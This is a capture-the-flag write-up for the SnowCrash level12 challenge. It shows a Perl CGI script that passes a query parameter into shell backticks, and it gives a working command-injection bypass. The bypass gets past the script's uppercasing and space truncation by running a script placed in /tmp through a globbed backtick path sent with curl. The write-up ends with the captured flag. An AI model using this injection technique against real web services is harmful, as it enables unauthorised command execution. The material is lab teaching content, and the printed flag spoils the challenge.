# 📜 Level12 Writeup
## Level Overview

Category: Remote Exploitation / Command Injection

Description:
We are given a CGI Perl script that runs on localhost:4646. The script takes two parameters x and y from a web request and processes them with some transformations before passing them into a shell command via backticks.

While the script appears to be searching through /tmp/xd for matching lines, it uses unsanitized user input in a shell call, which opens the door for command execution. However, because of how the script uppercases and truncates input, direct injection fails. Instead, the intended exploitation path is to place a malicious script in /tmp and trick the Perl script into executing it.

## The Vulnerable Script
```perl
#!/usr/bin/env perl
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));

```

## Observations

The script is written in Perl and runs as a CGI handler on port 4646.

Input comes from query parameters x and y.

The x parameter is uppercased and truncated at the first space:

```perl
$xx =~ tr/a-z/A-Z/;
$xx =~ s/\s.*//;
```

Then it is interpolated inside a backtick execution:

```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

Since backticks execute a shell command, any properly formatted injection will execute on the system.

## Identifying the Vulnerability
At first glance, this looks like straightforward command injection. But attempts like:
```bash
curl "http://localhost:4646/?x=touch /tmp/flaka"
```

fail because:

- touch → becomes TOUCH (invalid command)
- Spaces are truncated → arguments are lost

So direct injection does not work.

Instead, we realize that backticks expand file paths as commands. If we create our own script in /tmp, the vulnerable CGI will happily run it when invoked.

## Exploit Strategy

1. Create a malicious script in /tmp
2. Make it executable
3. Trigger the CGI script with an input that expands to our malicious file
4. The script will execute our payload

## Exploitation

We write a small Bash script to grab the flag:

```bash
level12@SnowCrash:/tmp$ cat POPO
#!/bin/bash

getflag > /var/crash/flaka
```

Make it executable:
```bash
level12@SnowCrash:/tmp$ chmod +x POPO
```

Then, we call the vulnerable CGI with an input that executes /tmp/POPO:

```bash
level12@SnowCrash:/tmp$ curl "http://localhost:4646/?x=\`/*/POPO\`"
```

This works because:
- The input `` `/*/POPO` `` contains backticks that will be executed by the shell
- Even after uppercasing, the wildcards `/*` still expand to `/tmp` 
- The backticks cause the shell to execute `/tmp/POPO` directly
- Our malicious script gets executed before the egrep command even runs

Afterwards, we check /var/crash and find our flag:

```bash
level12@SnowCrash:/var/crash$ ls
flaka  popo
level12@SnowCrash:/var/crash$ cat flaka
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

## Conclusion

- The vulnerability was unsanitized backticks execution
- Direct command injection fails due to uppercasing and truncation
- By placing a script in /tmp and using the right path format, we bypass the filters and achieve execution
- The key insight was understanding that the shell would attempt to execute our script path even when used in the egrep command

Final flag:
```bash
g1qKMiRpXf53AWhDaU7FEkczr
```
